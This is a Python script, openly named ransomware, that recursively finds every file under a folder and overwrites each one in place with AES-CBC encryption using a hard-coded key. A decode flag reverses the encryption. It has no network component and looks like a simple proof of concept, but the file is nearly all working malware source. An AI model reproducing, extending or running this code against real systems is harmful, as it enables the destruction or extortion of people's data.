#######################
# @author: RaffaDNDM
# @date:   2022-02-27
#######################

from Crypto.Cipher import AES
from Crypto import Random
import argparse
import glob
import os
from termcolor import cprint, colored

class Ransomware:
    '''
    AES ccipher/decipher of files inside a folder.

    Args:
        path (str): Path of the folder in which you want to encrypt 
                    all the files (found recursively also in subfolders)

    Attributes:
        KEY (bytes): Key used in AES to encrypt the messages

        PATH (str): Path of the folder in which you want to encrypt 
                    all the files (found recursively also in subfolders)
        
        DEFAULT_PATH: Default path of the folder in which you want to encrypt 
                      all the files (found recursively also in subfolders)

        FILE_LIST (list): List with the paths of all the files found
                          recursively in PATH

        DIR_LIST (list):  List with the paths of all the folder/subfolders
                          analysed to find the files

    '''

    KEY = b'\xbf\xc0\x85)\x10nc\x94\x02)j\xdf\xcb\xc4\x94\x9d(\x9e[EX\xc8\xd5\xbfI{\xa2$\x05(\xd5\x18'    
    DEFAULT_PATH = 'dat/'
    FILE_LIST = []
    DIR_LIST = []

    def __init__(self, path=DEFAULT_PATH):
        self.PATH = path
        self.DIR_LIST.append(self.PATH)

    def encrypt(self):
        '''
        Encrypt all the files found ricursively in PATH.
        '''

        #Find all the files contained recursively in the specified path
        self.find_files_recursive()

        #Encrypt each file
        for x in self.FILE_LIST:
            print('Encoding '+colored(x, 'yellow')+' ...', end= '    ')

            #Read the binary content of a file
            with open(x, 'rb') as f:
                msg = f.read()    
            
            #Encrypt the content
            encrypted_msg = self.encrypt_msg(msg)

            #Replace the content of the file with its encryption
            with open(x, 'wb') as f:
                f.write(encrypted_msg)

            print(f'completed')

    def decrypt(self):
        '''
        Decrypt all the files found ricursively in PATH.
        '''
        
        #Find all the files contained recursively in the specified path
        self.find_files_recursive()

        #Decrypt each file
        for x in self.FILE_LIST:
            print('Decoding '+colored(x, 'yellow')+' ...', end= '    ')

            #Read the binary content of a file
            with open(x, 'rb') as f:
                msg = f.read()    
            
            #Decrypt the content
            decrypted_msg = self.decrypt_msg(msg)

            #Replace the content of the file with its decryption
            with open(x, 'wb') as f:
                f.write(decrypted_msg)

            print(f'completed')

    def encrypt_msg(self, msg):
        '''
        Encrypt a bytes message with AES.

        Args:
            msg (bytes): Message to be encrypted

        Returns:
            encoded_msg (bytes): Encrypted message
        '''
        
        #Padding msg
        msg = self.pad_msg(msg)
        #Initialization vector
        IV = Random.new().read(AES.block_size)
        #AES cipher with Cipher Block Chaining (CBC) techinque
        cipher = AES.new(self.KEY, AES.MODE_CBC, IV)
        #Message encrypted
        return IV + cipher.encrypt(msg)

    def decrypt_msg(self, msg):
        '''
        Decrypt a bytes message with AES.

        Args:
            msg (bytes): Message to be decrypted

        Returns:
            encoded_msg (bytes): Decrypted message
        '''
        
        #Initialization vector (beginning of the encoded text)
        IV = msg[:AES.block_size]
        #AES cipher with Cipher Block Chaining (CBC) techinque
        cipher = AES.new(self.KEY, AES.MODE_CBC, IV)
        #Message decrypted (from IV on)
        decoded_msg = cipher.decrypt(msg[AES.block_size:])
        #Message decrypted without last padding bytes
        return decoded_msg.rstrip(b"\0")

    def pad_msg(self, msg):
        '''
        Pad a bytes message by appending 0's to reach a size multiple
        of the block size used by AES.
        '''
        return msg + b'\0' * (AES.block_size - len(msg) % AES.block_size)

    def find_files_recursive(self):
        '''
        Find the files contained in the path specified in the
        constructor of the Ransomware, by looking for them 
        recursively in all the found subfolders.
        '''

        #Analyse all the directories in DIR_LIST
        for x in self.DIR_LIST:
            #List all the content of the folder analysed
            content_list = os.listdir(x)
            
            #Analyse the content of the folder
            for f in content_list:

                if os.path.isdir(x+f):
                    #If the content is a directory, the path of the
                    #subfolder is inserted in the directory list, so 
                    #it will be analysed in the next iteration of the
                    #loop
                    self.DIR_LIST.append(x+f+'/')
                else:
                    #If the content is a file, the file path is 
                    #added to FILE_LIST
                    self.FILE_LIST.append(x+f)

            #Show directory analysed during the current iteration
            cprint(x, 'red')

        #Print the list of all the files found recursively
        cprint(self.FILE_LIST, 'yellow')

def args_parser():
    '''
    Parser of command line arguments
    '''

    #Parser of command line arguments
    parser = argparse.ArgumentParser()
    
    #Initialization of needed arguments
    parser.add_argument("-decode", "-d", dest="decode", help="Decode option (by default, encode)", action='store_true')
    parser.add_argument("-path", "-p", dest="path", help="Path with files to be encrypted")
    
    #Parse command line arguments
    args = parser.parse_args()
    
    return args.decode, args.path

def main():
    decode_option, path = args_parser()
    print(path)
    #Creation of the ransomware
    virus = None   

    if path:
        virus = Ransomware(path)
    else:
        virus = Ransomware()

    if decode_option:
        virus.decrypt()
    else:
        virus.encrypt()

if __name__=='__main__':
    main()
